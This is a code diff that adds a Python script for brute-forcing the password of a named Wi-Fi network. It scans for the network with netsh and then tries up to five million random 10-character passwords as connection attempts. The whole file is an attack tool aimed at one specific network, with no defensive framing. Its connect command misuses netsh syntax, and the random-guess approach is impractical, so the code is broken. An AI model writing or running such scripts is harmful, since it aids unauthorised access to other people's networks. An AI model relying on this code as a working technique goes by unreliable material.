@@ -1,0 +1,62 @@
+import subprocess
+import random
+import string
+
+def generate_password(length):
+    """Generates a random password of a given length"""
+    chars = string.ascii_lowercase + string.ascii_uppercase + string.digits
+    return ''.join(random.choice(chars) for _ in range(length))
+
+def test_password(network, password):
+    """Tries to connect to a network using the given password"""
+    # Set up the command to connect to the network with the given password
+    command = f'netsh wlan connect ssid="{network}" keyMaterial="{password}"'
+
+    # Try to connect to the network with the given password
+    connect_output = subprocess.run(command, capture_output=True, text=True)
+
+    # Check if the connection was successful
+    if "Connection request was completed successfully." in connect_output.stdout:
+        return True
+    else:
+        return False
+
+# Set the length of the random passwords to generate
+password_length = 10
+
+# Set the maximum number of attempts to try
+max_attempts = 5000000
+
+# Set the network to target
+target_network = "CYTA_a2fA"
+
+# Set the number of attempts so far to 0
+attempts = 0
+
+# Scan for available networks
+scan_output = subprocess.run(["netsh", "wlan", "show", "networks"], capture_output=True, text=True)
+
+# Parse the output of the scan command to find the network we want to test
+network_found = False
+for line in scan_output.stdout.splitlines():
+    if "SSID" in line:
+        network_name = line.split(":")[1].strip()
+        if network_name == target_network:
+            network_found = True
+            break
+
+# If network found, test each password
+if network_found:
+    print(f"Found target network: {target_network}")
+    for i in range(max_attempts):
+        # Generate a random password and test it on the network
+        password = generate_password(password_length)
+        if test_password(target_network, password):
+            print(f"Found correct password for network {target_network}: {password}")
+            break
+
+        attempts += 1
+        if attempts % 10 == 0:
+            print(f"Attempts so far: {attempts}")
+else:
+    print(f"Could not find target network: {target_network}")
